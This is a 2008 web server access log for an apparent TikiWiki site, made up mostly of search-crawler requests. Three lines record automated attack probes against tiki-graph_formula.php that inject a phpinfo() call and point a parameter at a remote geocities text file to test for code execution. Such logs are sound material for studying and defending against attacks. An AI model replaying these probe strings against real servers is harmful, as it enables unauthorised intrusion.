66.249.71.144 - - [03/Aug/2008:04:05:23 ] "GET /tiki-galleries.php?offset=0&sort_mode=user_desc HTTP/1.1" 200 3453 "OK" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
210.146.46.3 - - [03/Aug/2008:04:14:49 ] "GET /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://www.geocities.com/arabheck/id.txt?? HTTP/1.1" 404 1000 "" "libwww-perl/5.808"
74.6.22.189 - - [03/Aug/2008:04:15:03 ] "GET /tiki-usermenu.php?url=%2Ftiki-index.php%3Fpage%3DVoIP%2520System%2520Description HTTP/1.0" 200 3013 "OK" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
208.80.193.32 - - [03/Aug/2008:04:16:57 ] "GET / HTTP/1.0" 302 100 "" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; snprtz|T16938900000615|2600#Service Pack 2#2#5#1; .NET CLR 1.1.4322)"
65.98.89.43 - - [03/Aug/2008:04:19:56 ] "GET /tiki-read_article.php?articleId=1/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://www.geocities.com/arabheck/id.txt?? HTTP/1.1" 200 10000 "OK" "libwww-perl/5.811"
65.98.89.43 - - [03/Aug/2008:04:20:00 ] "GET /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://www.geocities.com/arabheck/id.txt?? HTTP/1.1" 404 1000 "" "libwww-perl/5.811"
66.249.71.146 - - [03/Aug/2008:04:23:49 ] "GET /tiki-browse_gallery.php?galleryId=8&offset=80&sort_mode=user_desc HTTP/1.1" 200 3217 "OK" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.146 - - [03/Aug/2008:04:23:50 ] "GET /tiki-browse_gallery.php?galleryId=8&offset=96&sort_mode=filesize_asc HTTP/1.1" 200 3215 "OK" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.146 - - [03/Aug/2008:04:23:51 ] "GET /tiki-browse_gallery.php?galleryId=8&offset=80&sort_mode=created_asc HTTP/1.1" 200 3217 "OK" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.146 - - [03/Aug/2008:04:23:52 ] "GET /tiki-browse_gallery.php?galleryId=8&offset=80&sort_mode=filesize_desc HTTP/1.1" 200 3218 "OK" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.145 - - [03/Aug/2008:04:23:53 ] "GET /tiki-browse_gallery.php?galleryId=8&offset=80&sort_mode=hits_desc HTTP/1.1" 200 3218 "OK" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.146 - - [03/Aug/2008:04:23:54 ] "GET /tiki-browse_gallery.php?galleryId=8&offset=96&sort_mode=hits_asc HTTP/1.1" 200 3215 "OK" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
74.6.22.153 - - [03/Aug/2008:04:30:38 ] "GET /robots.txt HTTP/1.0" 200 2190 "OK" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.22.153 - - [03/Aug/2008:04:30:38 ] "GET /tiki-index.php?page=Miss%20Lee HTTP/1.0" 200 4879 "OK" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
213.136.52.113 - - [03/Aug/2008:04:35:52 ] "GET /tiki-blog_rss.php?blogId=1 HTTP/1.0" 200 10000 "OK" "http://www.planetmysql.org/; community@mysql.com"
208.111.154.95 - - [03/Aug/2008:04:38:04 ] "GET /tiki-view_blog.php?blogId=3 HTTP/1.0" 200 10000 "OK" "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.11) Gecko/20080109 (Charlotte/0.9t; http://www.searchme.com/support/)"
